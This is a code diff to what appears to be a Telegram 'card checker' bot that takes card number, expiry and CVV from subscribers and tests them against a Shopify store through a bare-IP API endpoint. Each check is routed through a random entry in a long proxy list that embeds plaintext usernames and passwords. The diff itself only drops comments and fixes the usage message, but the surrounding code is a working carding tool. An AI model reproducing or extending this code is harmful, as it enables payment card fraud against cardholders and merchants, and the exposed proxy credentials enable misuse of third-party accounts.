@@ -22,7 +22,6 @@ DATA_FILE = "users_data.json"
 
 # Complete Updated Proxy List
 PROXY_LIST = [
-    # New Added Proxies
     "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
     "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
     "reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
@@ -78,7 +77,6 @@ PROXY_LIST = [
     "purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
     "purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
     "purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
-    # Previous Proxies
     "naveed:Qwerty_123ABC@196.244.48.124:12345",
     "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
     "naveed:Qwerty_123ABC@196.244.48.26:12345",
@@ -396,7 +394,6 @@ async def process_card_string(card_line, user_full_name):
         site_url = "https://customsbyarrillc.myshopify.com"
         selected_proxy = random.choice(PROXY_LIST)
         
-        # API Endpoint with increased timeout configuration
         api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
         
         async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
@@ -429,7 +426,7 @@ async def process_card_string(card_line, user_full_name):
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
-            f"🤖 Bot By:  PRIME, SIMPLE BOY, SHINCHAN"
+            f"🤖 Bot By: PRIME, SIMPLE BOY, SHINCHAN"
         )
             
     except httpx.TimeoutException:
@@ -448,4 +445,7 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
         return
     if not context.args:
-        await update.message.reply_text("❌ Usage: /chk CC|MM
+        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
+        return
+    card_line = "".join(context.args)
+    user_full_name = update.effective_user.fi
